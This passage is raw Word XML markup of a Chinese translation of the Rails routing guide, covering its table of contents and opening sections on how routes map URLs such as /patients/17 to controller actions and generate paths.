          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId383" w:anchor="4" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>定制 Resourceful 的路由规则</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1457C60C"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84" w:anchor="4-1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>指定使用控制器。</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0655752F"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85" w:anchor="4-2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>指定限制：</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="177D2FBE"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86" w:anchor="4-3" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>覆盖 命名（Named） Helper</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="389D512F"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87" w:anchor="4-4" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">覆盖 </w:t>
        </w:r>
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>new</w:t>
        </w:r>
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 和 </w:t>
        </w:r>
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>edit</w:t>
        </w:r>
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 片段</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="064044A8"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88" w:anchor="4-5" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>为命名（named） 路由 Helper 加上前缀</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6A968691"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89" w:anchor="4-6" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>对建立的路由进行限制</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2BB568F4"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90" w:anchor="4-7" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>对路径进行翻译</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="69883147"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91" w:anchor="4-8" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>重定义单复数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="28D76C6D" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="008938C9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId392" w:anchor="5" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>对路由进行检查和测试</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6B676032"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93" w:anchor="5-1" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">通过 </w:t>
        </w:r>
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>rake</w:t>
        </w:r>
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 查看存在的路由规则</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="77E24CC1" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="008938C9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="94"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId394" w:anchor="5-2" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>路由测试</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3FA78C36"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1 Rails 路由的意义</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BAD67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Rails 路由能够识别 URL 并且将请求分发到对应的 控制器下的 action 中。 它也可以生成相对路径和 URL 来避免在你的视图中的硬编码（hardcode string）.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FC1C3A8"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1.1 链接 URL 和代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="377BE19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当你的 Rails 应用接收到一个像这样的请求时</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2136"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4705127F" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="268B3F38" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1913930987"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>GET /pa</w:t>
            </w:r>
            <w:bookmarkStart w:id="0" w:name="_GoBack"/>
            <w:bookmarkEnd w:id="0"/>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>tients/17</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="28A3731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它就会尝试着让路由去匹配字符串到一个控制器行为中。如果第一条路由规则是这样的：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5016"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="428331C7" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="21833B35" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="441388727"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match "/patients/:id"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "patients#show"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3E196AB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这个请求将会被分发到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>patients</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 控制器下面的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action 中去，同时 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>{ :id =&gt; “17” }</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会存储在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中。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7020F7DA"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1.2 用代码生成 URL 和 路径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD1579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你同样可以用路由来生成 URl 和路径，如果你的应用包含了这样的代码：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6816"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="7F7E3A7A" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69190268" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1593200332"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@patient</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Patient.find(17)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="2921AF31" w14:textId="77777777" w:rsidTr="00DC4B44">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28964D5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link_to "Patient Record", patient_path(@patient) %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0C4AA13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路由将会自动生成一个路径 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/patients/17</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，这将使你的代码更加简洁易懂而健壮。注意这里我们没必要将 id 传递给路由 Helper。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2616F66C"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2 Resource 路由规则: Rails 之道</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F85F5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Resource 路由规则能让你迅速地构建出 resourceful 的控制器所需常用路由规则，它可以自动地为你生成 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>index</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>edit</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>update</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>destroy</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 行为，而一个 Resourceful 的路由声明只需要一行代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286F02E6"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2.1 web 与 Resource</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45CEE70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浏览器向 Rails 的一个页面发起请求 URL 的时候必须要指定一个 HTTP 请求方法，例如 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PATCH</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PUT</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>DELETE</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.这些方法将会对 Rails 中的资源进行不同的操作。而一个 Resource 的路由规则将会为一个控制器自动匹配多种相关方法。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D82D21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例如，当你的 Rails 程序接收到了这样的请求：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
